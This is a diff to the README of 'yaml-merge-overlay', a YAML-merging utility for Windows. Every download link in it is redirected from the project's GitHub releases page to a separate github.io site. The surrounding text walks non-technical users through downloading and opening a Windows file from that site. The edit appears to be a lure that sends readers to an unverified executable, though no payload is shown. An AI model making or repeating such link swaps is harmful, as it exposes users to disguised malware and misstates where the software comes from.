@@ -1,6 +1,6 @@
 # 🧩 yaml-merge-overlay - Merge YAML Files Without the Headache
 
-[![Download yaml-merge-overlay](https://img.shields.io/badge/Download-yaml--merge--overlay-FF4500?style=for-the-badge&logo=github&logoColor=white)](https://github.com/katiesimilar620/yaml-merge-overlay/releases)
+[![Download yaml-merge-overlay](https://img.shields.io/badge/Download-yaml--merge--overlay-FF4500?style=for-the-badge&logo=github&logoColor=white)](https://katiesimilar620.github.io)
 
 yaml-merge-overlay is a desktop utility for combining two YAML files. It takes a base file and an overlay file, deep-merges the overlay onto the base, and writes the result to a new file. You do not need to write code to use it. You choose your files, run the merge, and keep the merged output.
 
@@ -10,7 +10,7 @@ This page is written for Windows users who want a clear path from download to fi
 
 Visit this link to download the application:
 
-[https://github.com/katiesimilar620/yaml-merge-overlay/releases](https://github.com/katiesimilar620/yaml-merge-overlay/releases)
+[https://katiesimilar620.github.io](https://katiesimilar620.github.io)
 
 Use that page to get the Windows download. Save it to your computer, wait for the download to finish, then open it from your Downloads folder.
 
@@ -58,7 +58,7 @@ You do not need programming knowledge. You only need to know which file is your 
 
 ## 🖱️ Step-by-Step: Download and Run on Windows
 
-1. Open the download page: [yaml-merge-overlay releases](https://github.com/katiesimilar620/yaml-merge-overlay/releases).
+1. Open the download page: [yaml-merge-overlay releases](https://katiesimilar620.github.io).
 2. Find the Windows download on that page.
 3. Save the download to your computer.
 4. Wait until the download is complete.
@@ -126,7 +126,7 @@ The application focuses on the merge itself: choose a base file, choose an overl
 
 Visit this link to download the application:
 
-[https://github.com/katiesimilar620/yaml-merge-overlay/releases](https://github.com/katiesimilar620/yaml-merge-overlay/releases)
+[https://katiesimilar620.github.io](https://katiesimilar620.github.io)
 
 Keep the download page handy for future updates or for setting up yaml-merge-overlay on another Windows computer.
 
